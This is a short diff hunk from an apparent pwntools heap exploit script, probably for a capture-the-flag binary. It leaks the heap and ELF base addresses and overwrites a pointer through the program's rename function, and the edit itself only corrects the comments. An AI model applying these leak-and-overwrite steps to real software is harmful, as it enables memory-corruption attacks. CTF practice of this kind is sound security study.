@@ -86,13 +86,14 @@ alloc_a(0x80, "G" * 0x80)
 alloc_a(0x60, 'H' * 0x60)
 alloc_a(0x40, 'I' * 0x40)
 
-#leak elf
+# leak heap
 l = show_a(4)
 heap_base = u64(l + "\x00" * 2) - 0x15f0
 rename_a(4, p64(heap_base + 0x14b0))
 log.info("heap_base: 0x{:x}".format(heap_base))
 #gdb.attach(r)
 
+# leak elf
 l = show_a(8)
 rename_a(8, l)
 elf_base = u64(l + "\x00" * 2) - 0x202720
